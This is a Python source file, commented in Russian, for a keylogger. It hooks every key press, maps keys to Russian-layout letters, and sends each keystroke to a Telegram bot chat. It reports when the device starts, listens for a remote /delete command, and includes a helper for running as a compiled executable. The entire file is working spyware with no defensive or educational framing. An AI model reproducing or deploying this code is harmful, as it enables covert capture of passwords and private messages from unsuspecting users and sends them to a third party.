import requests
import os
import keyboard
import sys
import time

# Настройки Telegram
BOT_TOKEN = ''  # Укажите свой токен бота
CHAT_ID = ''  # Укажите ID чата
user_name = os.getenv("USERNAME")

# Словарь для соответствий между русской и английской раскладкой
layout_map = {
    "q": "й", "w": "ц", "e": "у", "r": "к", "t": "е", "y": "н", "u": "г", "i": "ш", "o": "щ", "p": "з",
    "[": "х", "]": "ъ", "a": "ф", "s": "ы", "d": "в", "f": "а", "g": "п", "h": "р", "j": "о", "k": "л",
    "l": "д", ";": "ж", "'": "э", "z": "я", "x": "ч", "c": "с", "v": "м", "b": "и", "n": "т", "m": "ь",
    ",": "б", ".": "ю", "/": ".",
    "Q": "Й", "W": "Ц", "E": "У", "R": "К", "T": "Е", "Y": "Н", "U": "Г", "I": "Ш", "O": "Щ", "P": "З",
    "A": "Ф", "S": "Ы", "D": "В", "F": "А", "G": "П", "H": "Р", "J": "О", "K": "Л", "L": "Д", "Z": "Я",
    "X": "Ч", "C": "С", "V": "М", "B": "И", "N": "Т", "M": "Ь"
}

# Переменная для хранения последнего ID обновления
last_update_id = None


# Функция для отправки сообщений в Telegram
def send_to_telegram(text):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {'chat_id': CHAT_ID, 'text': text}

    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()  # Проверка на HTTP-ошибки
    except requests.exceptions.RequestException as e:
        print(f"Ошибка отправки в Telegram: {e}")


# Очистка старых обновлений
def clear_old_updates():
    global last_update_id
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates'

    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()

        if 'result' in data and data['result']:
            # Берём максимальный update_id
            last_update_id = max(update['update_id'] for update in data['result'])
    except Exception as e:
        print(f"Ошибка очистки старых обновлений: {e}")
        send_to_telegram(f"Ошибка очистки обновлений: {e}")


# Проверка команд в Telegram
def check_telegram_command():
    global last_update_id
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates'
    params = {'offset': last_update_id + 1} if last_update_id else {}

    try:
        response = requests.get(url, params=params)
        response.raise_for_status()
        data = response.json()

        if 'result' in data:
            for update in data['result']:
                update_id = update['update_id']
                last_update_id = update_id  # Обновляем ID последнего обработанного обновления

                if 'message' in update and 'text' in update['message']:
                    text = update['message']['text']
                    if text == '/delete':
                        uninstall()
    except Exception as e:
        print(f"Ошибка проверки команды: {e}")
        send_to_telegram(f"Ошибка проверки команды: {e}")
    time.sleep(1)  # Задержка для снижения нагрузки


# Получение пути к текущему исполняемому файлу
def get_current_executable_path():
    if getattr(sys, 'frozen', False):  # Если программа компилирована (Nuitka/py2exe/pyinstaller)
        return sys.executable
    return os.path.abspath(__file__)


# Удаление программы
def uninstall():
    send_to_telegram("Программа выходит..")
    sys.exit(0)  # Завершаем выполнение программы


# Обработка нажатий клавиш
def process_key(event):
    try:
        if event.event_type == keyboard.KEY_DOWN:  # Отправляем только нажатия
            key_name = event.name

            if key_name in layout_map:
                russian_letter = layout_map[key_name]
                send_to_telegram(f"Нажата клавиша: {russian_letter} или {key_name}")
            else:
                send_to_telegram(f"Нажата клавиша: {key_name}")
    except Exception as e:
        print(f"Ошибка обработки клавиши: {e}")
        send_to_telegram(f"Ошибка обработки клавиши: {e}")


# Основная функция
def main():
    send_to_telegram("Устройство включено")
    clear_old_updates()  # Очищаем старые обновления
    keyboard.hook(process_key)  # Устанавливаем хук для обработки клавиш

    while True:
        check_telegram_command()  # Проверяем команды в Telegram


# Запуск программы
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        send_to_telegram(f"Критическая ошибка: {e}")
        print(f"Критическая ошибка: {e}")
